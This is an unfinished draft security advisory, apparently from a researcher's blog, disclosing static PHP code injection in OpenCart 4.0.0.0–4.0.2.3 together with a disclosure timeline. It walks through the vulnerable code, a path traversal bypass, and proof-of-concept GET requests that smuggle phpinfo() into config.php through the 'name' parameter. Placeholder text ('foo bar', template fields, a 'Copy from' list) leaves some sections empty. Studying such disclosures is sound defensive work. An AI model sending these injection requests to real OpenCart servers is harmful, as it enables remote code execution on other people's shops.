---
layout: post
title: "(CVE-2023-XXXXX) Static Code Injections in OpenCart versions 4.0.0.0 to 4.0.2.3"
has_children: no
parent: "Disclosed vulnerabilities"
date: 2023-04-30
last_update: 2023-11-15
nav_order: 2023-04-30
reading_time: 10 min
permalink: /test/
screenshots: opencart-rce/
tags: tag1 tag2 tag3

twitter_text: Very short description for twitter 
description: A summary/assay for the article
---


Copy from:
- https://www.zerodayinitiative.com/blog/2022/11/22/cve-2022-40300-sql-injection-in-manageengine-privileged-access-management
- https://voidsec.com/fuzzing-faststone-image-viewer-cve-2021-26236/
- https://m3ssap0.github.io/articles/cacti_authenticated_command_injection_snmp.html
- https://starlabs.sg/advisories/23/23-2315/

{: .abstract }
>In OpenCart versions 4.0.0.0 to 4.0.2.3, authenticated backend users having `common/security` write privileges can write arbitrary untrusted data inside `config.php` and `admin/config.php`, resulting in remote code execution on the underlying server.


## Summary

<dl>
  <dt>Product</dt>
  <dd><a href="https://github.com/opencart/opencart">OpenCart</a></dd>
  <dt>Vendor</dt>
  <dd><a href="https://www.opencart.com/index.php?route=common/home">OpenCart</a></dd>
  <dt>Severity</dt>
  <dd>High</dd>
  <dt>Affected Version(s)</dt>
  <dd>4.0.0.0 - 4.0.2.3</dd>
  <dt>Tested Version(s)</dt>
  <dd>4.0.2.2, 4.0.2.3</dd>
  <dt>CVE</dt>
  <dd>N/A</dd>
  <dt>CVE Description</dt>
  <dd>In OpenCart versions 4.0.0.0 to 4.0.2.3, authenticated backend users having common/security write privilege can write arbitrary untrusted data inside config.php and admin/config.php, resulting in remote code execution on the underlying server.</dd>
  <dt>CWE</dt>
  <dd><a href="https://cwe.mitre.org/data/definitions/96.html">CWE-96: Improper Neutralization of Directives in Statically Saved Code</a></dd>
</dl>

### CVSS 3.1 Score

**Base Score:** 8.8 (High)  
**Vector String:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`

|**Metric**|**Value**|
|---|---|
|**Attack Vector (AV)**|Network|
|**Attack Complexity (AC)**|Low|
|**Privileges Required (PR)**|Low|
|**User Interaction (UI)**|None|
|**Scope (S)**|Unchanged|
|**Confidentiality (C)**|High|
|**Integrity (I)**|High|
|**Availability (A)**|High|


# Vulnerabilities

There are two distinct static code injection vulnerabilities in the function used to move the `storage` folder outside the application web-root, and the function that renames the secret `admin` path after the installation. While the latter can be exploited only if the `admin` folder has not yet been renamed, the former one can be exploited anytime, even if the `storage` folder has already been moved. Both the vulnerabilities require that the user has the `common/security` write privilege enable. Exploiting them, an authenticated adversary can inject arbitrary static PHP code that will be executed on every page, finally resulting in arbitrary remote code execution. Those vulnerabilities were both introduced from OpenCart 4.0.0.0 onward.

{: .danger }
>Because of the nature of the vulnerabilities, it is very likely to create disruption and break the application completely if the initial state of the `storage` directory is not restored at the end of exploitation.

## Vulnerabilities Details and Root Causes

### Static Code Injection in common/security.storage

{: .bug }
>The `storage()` function in `upload/admin/controller/common/security.php` is vulnerable to PHP static code injection becuse `$name` and `$path` user-controlled variable are concatenated and placed inside `$base_new`, which is then wrote inside the `config.php` and `admin/config.php` files, without proper escape or validation.

The relevant vulnerable code can be found below:

*4.0.2.3/upload/admin/controller/common/security.php*
```php
public function storage(): void {
    // ...
    if (isset($this->request->get["page"])) {
        $page = (int)$this->request->get["page"];
    } else {
        $page = 1;
    }
    if (isset($this->request->get["name"])) {
        $name = preg_replace( // [1]
            "[^a-zA-z0-9_]",
            "",
            basename(
                html_entity_decode(
                    trim($this->request->get["name"]), 
                    ENT_QUOTES,
                    "UTF-8"
                )
            )
        );
    } else {
        $name = "";
    }
    if (isset($this->request->get["path"])) {
        $path = preg_replace( // [2]
            "[^a-zA-z0-9_\:\/]",
            "",
            html_entity_decode(
                trim($this->request->get["path"]), 
                ENT_QUOTES,
                "UTF-8"
            )
        );
    } else {
        $path = "";
    }
    $json = [];
    if ($this->user->hasPermission("modify", "common/security")) {
        // ...
        $base_new = $path . $name . "/";
        // ...
        $root = str_replace("\\", "/", realpath($this->request->server["DOCUMENT_ROOT"] . "/../"));
        if (substr($base_new, 0, strlen($root)) != $root || $root == $base_new) { // [3]
            $json["error"] = $this->language->get("error_storage");
        }
        if (is_dir($base_new) && $page < 2) { // [4]
            $json["error"] = $this->language->get("error_storage_exists");
        }
        if (!is_writable(DIR_OPENCART . "config.php") || !is_writable(DIR_APPLICATION . "config.php")) {
            $json["error"] = $this->language->get("error_writable");
        }
    } else {
        $json["error"] = $this->language->get("error_permission");
    }
    if (!$json) {
        // ...
        // Create the new storage folder
        if (!is_dir($base_new)) {
            mkdir($base_new, 0777); // [5]
            
        }
        // ...
        for ($i = $start;$i < $end;$i++) {
            // moving all the files and directories from the old storage folder to the newer one
            // ...
            
        }
        if ($end < $total) {
            $json["next"] = $this->url->link(
                "common/security.storage",
                "&user_token=" .
                    $this->session->data["user_token"] .
                    "&name=" .
                    $name .
                    "&path=" .
                    $path .
                    "&page=" .
                    ($page + 1),
                true
            );
        } else {
            // Start deleting old storage location files and directories.
            // ...
            rmdir($base_old);
            // Modify the config files
            $files = [DIR_APPLICATION . "config.php", DIR_OPENCART . "config.php", ];
            foreach ($files as $file) {
                $output = "";
                $lines = file($file);
                foreach ($lines as $line_id => $line) {
                    if (strpos($line, 'define(\'DIR_STORAGE') !== false) {
                        $output.= 'define(\'DIR_STORAGE\', \'' . $base_new . '\');' . "\n"; // [6]
                        
                    } else {
                        $output.= $line;
                    }
                }
                $file = fopen($file, "w");
                fwrite($file, $output);
                fclose($file);
            }
            // ...
        }
    }
}
```
At `[1]` and `[2]`, the new storage directory's name and path are obtained from the incoming HTTP GET request and stored into `$name` and `$path` PHP variables. In both cases, a regex is applied in order to remove special untrusted characters, however the regex is badly implemented and so does nothing. Furthermore, the `basename()` [^basename] function is used on the supplied 'name' parameter, preventing us from using `/` character inside it.

[^basename]: [`basename`](https://www.php.net/manual/en/function.basename.php), php.net

```php
$foo = "storage99');phpinfo();%23";
$name = preg_replace('[^a-zA-z0-9_]', '', basename(html_entity_decode(trim($foo), ENT_QUOTES, 'UTF-8')));

print($name); // storage99');phpinfo();%23
print("\n\n");

$name = preg_replace('/[^a-zA-z0-9_]/', '', basename(html_entity_decode(trim($foo), ENT_QUOTES, 'UTF-8')));

print($name); // storage99phpinfo23
print("\n\n");
```
At `[3]`, after having verified the authenticated user has write privilege for `common/security`, some checks are performed on `$base_new`, which is the concatenation of `$name` and `$path`. Here the application checks that `$base_new` is located inside the OpenCart root folder, however (if required), it's possible to use a path traversal and bypass the control:

```php
<?php

$root = str_replace('\\', '/', realpath('$this->request->server["DOCUMENT_ROOT"]' . '/../'));
print($root . "\n\n"); // /home/kali/Projects/OpenCart/4.0.2.3/

$base_new = '/dev/shm/new-folder'; // result -> Error!
$base_new = '/home/kali/Projects/new-folder'; // result -> Error!
$base_new = '/dev/shm/new-folder'; // result -> Error!
$base_new = '/home/kali/Projects/OpenCart/4.0.2.3/new-folder';  // result -> Accepted!
$base_new = '/home/kali/Projects/OpenCart/4.0.2.3/../../../../../../../../dev/shm/new-folder'; // result -> Accepted!

if ((substr($base_new, 0, strlen($root)) != $root) || ($root == $base_new)) {
  print("Error!");
}else{
  print("Accepted!");
}
?>
```

The OpenCart installation directory can be retrieved in many different ways. It can be leaked through the GUI (if the `storage` folder has never been moved), or through verbose errors (eg. CVE-2011-3763 [^3763]), it can be read from logs if the user has `tool/log` read privileges, etc.

[^3763]: [CVE-2011-3763](https://nvd.nist.gov/vuln/detail/CVE-2011-3763)

![path-disclosure]({{page.screenshots}}sc1.png){: width="220" }

At `[4]`, the application checks that `$base_new` does not already exist and `config.php` and `admin/config.php` have writable privileges.
If no error has occurred, the application creates the new folder `[5]` and moves all the files from the old `storage` path to the newer one.<br>
Finally, at `[6]`, it replaces inside `config.php` and `admin/conf.php` the old `DIR_STORAGE` value with the newer one, without performing any further checks on the variable.

In a normal scenario, the storage directory will be moved to a newer location under the OpenCart web folder, and the corresponding configuration files will be updated accordingly. However, since there is a lack of input sanitisation, it is possible to inject a new storage path inside the configuration files, containing special characters that allows to escape the `define()` function and add arbitrary PHP code.

*4.0.2.3/upload/admin/config.php*
```php
// Default DIR_STORAGE value
define('DIR_STORAGE', DIR_SYSTEM . 'storage/');

// DIR_STORAGE after a legitimate move
define('DIR_STORAGE', '/home/kali/Projects/OpenCart/4.0.2.3/storage-bis/');

// DIR_STORAGE after the exploitation
define('DIR_STORAGE', '/home/kali/Projects/OpenCart/4.0.2.3/storage-bis/');phpinfo();#');
```

### Static Code Injection in common/security.admin

{: .bug }
>foo bar

![broadcast-receiver]({{page.screenshots}}broadcast-receiver.png)
![pin]({{page.screenshots}}sc1.png){: width="220" }
{: .text-center }

## Exploit Conditions and Prerequisites

Both the vulnerabilities can be exploited if the attacker has valid credentials for the backend dashboard with `write` permissions on `common/security`.
Furthermore, an additional pre-requisite is needed to exploit the `admin` function (`common/security.admin`), whereby the `admin/` folder must be the default one and must not have been previously renamed.

## Proof-of-Concept

{: .note }
>A full automated exploit is still under developement and will be released soon.

The vulnerability in `common/security.storage` can be exploited by sending a GET request to `https://<url>/opencart/admin/index.php?route=common/security.storage&name=storage99/');phpinfo();%23&path=/<installation_path>/system/storage/&user_token=<user_token>`:

```http
GET /opencart-latest/admin/index.php?route=common/security.storage&name=storage99/');phpinfo();%23&path=/var/www/html/opencart-latest/system/storage/&user_token=d802a58437c44a666e0c74b52e31d948 HTTP/1.1
Host: localhost
Cookie: OCSESSID=fbc47c7e5098550f0c12070be0
```
<br>

The vulnerability in `common/security.admin` can be exploited by sending a GET request to `https://<url>/opencart/admin/index.php?route=common/security.admin&page=10&user_token=3cf1fa8ece0d0edce6354eab30d7d932&name=admin1');phpinfo();%23`:

```http
GET /opencart-latest/admin/index.php?route=common/security.admin&page=10&user_token=3cf1fa8ece0d0edce6354eab30d7d932&name=admin1');phpinfo();%23 HTTP/1.1
Host: localhost
Cookie: OCSESSID=fbc47c7e5098550f0c12070be0
```

## Video

## Disclosure Timeline
> *Please refer to the <a href="{{site.url}}/disclosures/policy/">disclosure policy</a> page for further details about the disclosure policy adopted by 0xbro.*<br>

- **14/10/2023**: Discovered both the vulnerabilities in `opencart/upload/admin/controller/common/security.php`<br>
- **17/10/2023**: Contacted OpenCart at `support@opencart.com` without receiving any response.<br>
- **24/10/2023**: Contacted OpenCart at `webmaster@opencart.com` without receiving any response.<br>
- **30/10/2023**: Following the official [guidelines](https://github.com/opencart/opencart#reporting-a-bug), published a [post](https://forum.opencart.com/viewtopic.php?t=232348) on the official OpenCart forum as a final attempt to contact the OpenCart team.<br>
